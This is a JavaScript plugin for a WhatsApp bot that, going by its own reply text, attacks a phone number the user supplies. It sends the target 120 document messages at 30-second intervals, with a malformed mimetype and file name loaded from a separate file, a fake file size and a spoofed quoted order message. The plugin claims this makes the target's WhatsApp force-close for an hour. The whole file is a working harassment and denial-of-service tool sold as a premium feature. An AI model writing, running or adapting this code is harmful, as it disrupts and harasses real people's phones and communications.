let { ngazap } = require('../src/ngazap.js')
let fs = require('fs')
doctext = fs.readFileSync('./src/doctext.txt')
let handler = async(m, { conn, usedPrefix, command, text }) => {
    let nomornya = text.replace(/[^0-9]/g, '')
    var troli = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) }, "message": {orderMessage: {itemCount: 999999,status: 200, thumbnail: null, surface: 200, message: `© Kimimaru Md Bot ✓`, orderTitle: `© Kimimaru Md Bot ✓`, sellerJid: '0@s.whatsapp.net'}}}
    if (!text) { throw `Nomornya mana?Contoh : ${usedPrefix + command} 62857xx` 
    } else if (nomornya.includes('6285752765133')) {
        throw `ITU NOMOR OWNER BANH😅`
    } else {
    m.reply(`Berhasil Mengeksekusi Target
    
• Nomor: ${nomornya}
• Durasi: 1 Jam

Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 1 Jam Dari sekarang`)
for (let i = 0;i < 120;i++) {
conn.sendMessage(nomornya + '@s.whatsapp.net', { document: fs.readFileSync('./src/menu.jpg'), mimetype: `${doctext}`, fileName: `${doctext}.pdf`, fileLength: 9999999999, }, { quoted: troli })
await conn.delay(30000)
}
    }
}
handler.premium = true
handler.tags = ['premium']
handler.help = ['atk1jam']
handler.command = /^(atk1jam|santed1jam|serang1jam)$/i

module.exports = handler